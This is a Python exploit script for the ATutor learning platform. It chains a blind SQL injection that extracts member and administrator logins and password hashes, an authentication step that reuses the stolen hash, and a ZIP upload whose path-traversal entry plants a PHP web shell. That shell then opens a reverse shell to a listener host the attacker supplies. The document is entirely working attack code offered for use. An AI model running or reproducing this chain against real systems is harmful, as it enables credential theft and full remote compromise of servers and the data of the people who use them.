import sys, requests, hashlib, zipfile, re, argparse

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def searchFriends(ip, injStr):
	for i in range(32, 126):
		target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip, injStr.replace("[CHAR]", str(i)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if(content_length > 20):
			return i
	return None

def count(column, ip):
	counted = ""
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((select/**/count(%s)/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % (column,i)
		try:
			counted = chr(searchFriends(ip, injectStr))
		except:
			break
	return int(counted)

def inject(inj, ip):
	output = ""
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (inj,i)
		try:
			extractedChar = chr(searchFriends(ip, injectStr))
			sys.stdout.write(extractedChar)
			sys.stdout.flush()
			output = output + extractedChar
		except:
			break
	return output

def generateHash(passwd, token):
	m = hashlib.sha1()
	m.update(passwd.encode('utf-8') + token.encode('utf-8'))
	return m.hexdigest()

def delivery(ip, user, hash, lhost, lport):
	# Session setup
	s = requests.Session()
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
	}

	# Craft ZIP file
	z = zipfile.ZipFile("rce.zip", "w", zipfile.ZIP_DEFLATED)
	path = '../../../../../../../../../../var/www/html/ATutor/mods/rce/rce.phtml'
	z.writestr(path, '<html><body><form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET[\'cmd\'])){system($_GET[\'cmd\']);}?></pre></body></html>')
	z.writestr('imsmanifest.xml', 'notxml')
	z.close()

	# Authentication process
	target = "http://%s/login.php" % ip
	token = "xxx"
	output = dict()
	hashed = generateHash(hash, token)
	d = {
		"form_password_hidden" : hashed,
		"form_login": "%s" % user,
		"submit" : "Login",
		"token" : token
	}
	r = s.post(target, data=d, headers=headers)
	res = r.text
	if "You have logged in successfully." in res:
		print("\n\n[+] Login successful!")
	else:
		print("\n\n[!] Login failed.")
		sys.exit(-1)

	# Walk simulator
	deliveryTarget = "http://%s" % ip
	s.get(deliveryTarget + "/bounce.php?course=16777215", headers=headers, proxies=proxies)
	s.get(deliveryTarget + "/mods/_standard/tests/my_tests.php", headers=headers, proxies=proxies)
	s.get(deliveryTarget + "/mods/_standard/tests/index.php", headers=headers, proxies=proxies)

	# Actual File Upload process
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	}
	uploadFile = open('rce.zip', 'rb')
	uploadTarget = "http://%s/mods/_standard/tests/import_test.php" % ip
	fileUpload = s.post(uploadTarget, files = { "file" : ("rce.zip", uploadFile,'application/zip' ) }, data = {"submit_import" : "Import" }, headers=headers, proxies=proxies)
	result = fileUpload.text
	if "XML error: Not well-formed" in result:
		print("\n[+] Payload file successfully uploaded!")
	else:
		print("[!] File upload failed.")
		sys.exit(-1)

	# Remote Code Execution
	payload = "php -r '$sock=fsockopen(\"%s\",%s);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" % (lhost, lport)
	rce = "http://%s/mods/rce/rce.phtml?cmd=%s" % (ip, payload)
	s.get(rce, headers=headers)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--lhost', help='Local listener IP address', required=True)
	parser.add_argument('--lport', help='Local listener port', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.1:80/ATutor" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip
	lhost = args.lhost
	lport = args.lport

	# Commented for better performance ;)
	print("\n[+] Database version")
	query = "select/**/version()"
	dbVersion = inject(query, ip)

	print("\n\n[+] Retrieving credentials...")
	usercount = count("login", ip)
	for i in range(0, usercount):
		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
		username = inject(query, ip)
		print("")

	print("\n[+] Retrieving credentials from a privileged account...")
	query = "select/**/login/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminUser = inject(query, ip)
	print(":", end = '')
	query = "select/**/password/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminHash = inject(query, ip)
	delivery(ip, adminUser, adminHash, lhost, lport)

if __name__ == "__main__":
	main()
